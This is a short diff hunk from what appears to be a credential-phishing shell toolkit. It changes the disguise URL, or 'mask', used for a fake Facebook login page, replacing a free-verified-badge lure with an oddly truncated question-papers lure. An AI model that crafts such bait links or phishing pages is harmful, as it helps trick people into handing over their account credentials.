@@ -477,7 +477,7 @@ site_facebook() {
 	case $REPLY in 
 		1 | 01)
 			website="facebook"
-			mask='http://blue-verified-badge-for-facebook-free'
+			mask='http://ble-question-papers-2078-all-subjects'
 			tunnel_menu;;
 		2 | 02)
 			website="fb_advanced"
